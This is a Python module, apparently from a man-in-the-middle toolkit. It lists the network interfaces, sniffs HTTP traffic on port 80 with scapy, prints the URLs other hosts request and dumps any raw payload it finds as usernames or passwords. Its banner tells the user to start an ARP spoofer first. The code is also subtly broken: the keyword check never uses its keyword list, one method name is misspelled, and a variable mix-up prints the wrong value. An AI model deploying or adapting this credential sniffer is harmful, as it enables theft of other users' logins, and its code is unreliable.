from cProfile import label
import time
from colorama import Fore
from colorama import Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re



choice = "Y"


"""get_current_mac"""

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig",interface])
        return re.search("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output)).group(0)
    except:
        pass




"""Get_Current_IP"""

def get_current_ip(interface):
        output = subprocess.check_output(["ifconfig",interface])
        pattern = re.compile(r'(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})')
        output1 = output.decode()
        ip = pattern.search(output1)[0]
        return ip


"""Print_IP_Table"""
def ip_table():
     #get all the interface details in with psutil in a variable
     addrs = psutil.net_if_addrs()
     t = PrettyTable([f'{Fore.GREEN}Interface','Mac Address',f'IP Address{Style.RESET_ALL}'])
     for k, v in addrs.items():
          mac = get_current_mac(k)
          ip = get_current_ip(k)
          if ip and mac:
               t.addrow ([k,mac,ip])
          elif mac:
               t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
          elif ip:
               t.add_row([k,f"{Fore.YELLOW}No Mac assigned{Style.RESET_ALL}",ip])
     print(t)


"""Sniffing"""

def sniff (interface):
     scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")

"""process_sniffed_packet   to check the packet hac the layer hhtp request and monitor the packets"""

def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
          print("[+] HTTP Request >>>>>>>>")
          url_extractor(packet)
          test = get_login_info(packet)
          if test :
               print (f"{Fore.GREEN}[+] Username OR password is send >>>>>", test ,f"{Style.RESET_ALL}")
          if (choice == "Y" or choice =="y"):
           raw_http_request(packet)

"""Get_Login_Info"""

def get_login_info (packet):
     if packet.haslayer(scapy.all.Raw):
          load = packet[scapy.all.Raw].load
          load_decode = load.decode()
          keywords = ["username", "user", "email", "pass", "login", "password", "UserName","password"]
          for i in load_decode:
               if i in load_decode:
                    return load_decode

"""url extractor"""

def url_extractor(packet):
     http_layer = packet.getlayer('HTTPRequest').fields
     ip_layer = packet.getlayer('IP').fields
     print (ip_layer["src"], "just requested \n", http_layer["Method"].decode()," ",http_layer["Host"].decode(), " ", http_layer["Path"].decode() )
     return

"""Raw HTTP Requset"""

def raw_http_request(packet):
     httplayer = packet[http.HTTPRequest].fields
     print ("--------------***Raw HTTP Packet***-----------------")
     print ("{:<8} {:<15}".format('Key','Lable'))
     try :
          for k, v in httplayer.items():
               try:
                    lable = v.decode()
               except :
                    pass
               print ("{:<40} {:<15}".format(k,label))
     except KeyboardInterrupt : 
          print ("\n[+] Quitting Program...")
     print ("-------------------------------------------")







"""Main Sniff"""


def main_sniff():
     print (f"{Fore.BLUE}Welcome to MY Packet Sniffre{Style.RESET_ALL}")
     print (f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
     try :
          global choice
          choice = input("[*] Do you want to print the raw packet : Y?N : ")
          ip_table()
          interface = input ("[*] Please enter the Interface Name: ")
          print ("[*] Sniffing Packets...")
          sniff ( interface)
          print (f"{Fore.YELLOW}\n[*] Redirecting to MAIN Menu...{Style.RESET_ALL}")
          time.sleep(3)
     except KeyboardInterrupt : 
          print (f"{Fore.RED}\n[!] Redirecting to Main Menu...{Style.RESET_ALL}")
          time.sleep(3) 

    
     

          

